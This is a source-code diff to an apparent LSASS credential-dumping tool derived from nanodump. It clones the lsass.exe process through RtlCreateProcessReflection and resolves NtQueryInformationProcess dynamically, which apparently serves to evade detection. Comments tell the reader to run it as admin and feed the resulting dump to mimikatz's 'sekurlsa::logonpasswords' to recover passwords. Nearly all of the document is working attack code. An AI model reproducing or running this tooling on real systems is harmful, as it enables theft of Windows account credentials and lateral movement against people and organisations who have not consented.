@@ -5,6 +5,7 @@
 #include <winternl.h>
 #include <stdio.h>
 #include "nanodump.h"
+#include "utils.h"
 
 //process reflection stuff copied from: https://github.com/hasherezade/pe-sieve/blob/master/utils/process_reflection.cpp
 //minidump/process searching copied from: https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
@@ -12,9 +13,7 @@
 //as admin, run using: refl.exe
 //  then use mimikatz: sekurlsa::minidump refl.dmp ; sekurlsa::logonpasswords
 
-#pragma comment (lib, "Dbghelp.lib")
 #pragma comment (lib, "Advapi32.lib")
-#pragma comment (lib, "ntdll.lib")
 
 #define USE_RTL_PROCESS_REFLECTION
 
@@ -62,14 +61,23 @@ NTSTATUS(NTAPI* _RtlCreateProcessReflection) (
 
 // Win >= 8.1
 
-bool load_RtlCreateProcessReflection()
+extern "C"
+NTSTATUS (NTAPI *_NtQueryInformationProcess)(
+    IN HANDLE ProcessHandle,
+    IN PROCESSINFOCLASS ProcessInformationClass,
+    OUT PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength,
+    OUT PULONG ReturnLength OPTIONAL
+);
+
+bool load_ntdll()
 {
-    if (_RtlCreateProcessReflection == NULL) {
+    if (_RtlCreateProcessReflection == NULL)
+    {
         HMODULE lib = GetModuleHandleA("ntdll.dll");
         if (!lib) return false;
 
         FARPROC proc = GetProcAddress(lib, "RtlCreateProcessReflection");
-        if (!proc) return false;
 
         _RtlCreateProcessReflection = (NTSTATUS(NTAPI*) (
             HANDLE,
@@ -80,8 +88,18 @@ bool load_RtlCreateProcessReflection()
             T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*
             )) proc;
 
+        proc = GetProcAddress(lib, "NtQueryInformationProcess");
+
+        _NtQueryInformationProcess = (NTSTATUS(NTAPI*) (
+            HANDLE,
+            PROCESSINFOCLASS,
+            PVOID,
+            ULONG,
+            PULONG))proc;
+
+        if (_RtlCreateProcessReflection == NULL || _NtQueryInformationProcess == NULL)
+            return false;
     }
-    if (_RtlCreateProcessReflection == NULL) return false;
     return true;
 }
 
@@ -155,7 +173,7 @@ PVOID get_peb_address(
 
 #define ProcessInformationClass 0
 
-    NTSTATUS status = NtQueryInformationProcess(
+    NTSTATUS status = _NtQueryInformationProcess(
         hProcess,
         (PROCESSINFOCLASS)ProcessInformationClass,
         &basic_info,
@@ -172,7 +190,8 @@ PVOID get_peb_address(
 #endif
 }
 
-int main() {
+int main()
+{
     HANDLE hToken;
     OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
     TOKEN_PRIVILEGES tokenPriv;
@@ -190,7 +209,7 @@ int main() {
     processEntry.dwSize = sizeof(PROCESSENTRY32);
     LPCWSTR processName = L"";
     if (Process32First(snapshot, &processEntry)) {
-        while (_wcsicmp(processName, L"lsass.exe") != 0) {
+        while (_WCSICMP(processName, L"lsass.exe") != 0) {
             Process32Next(snapshot, &processEntry);
             processName = processEntry.szExeFile;
             lsassPID = processEntry.th32ProcessID;
@@ -202,14 +221,14 @@ int main() {
     lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
     DPRINT("Target PID: %d\n", lsassPID);
 
-    load_RtlCreateProcessReflection();
+    load_ntdll();
     t_refl_args args = { 0 };
     args.orig_hndl = lsassHandle;
     DWORD ret = refl_creator(&args);
 
     if (args.returned_hndl == 0)
 
-    printf("Clone PID: %d\n", args.returned_pid);
+    DPRINT("Clone PID: %d\n", args.returned_pid);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, args.returned_pid);
 
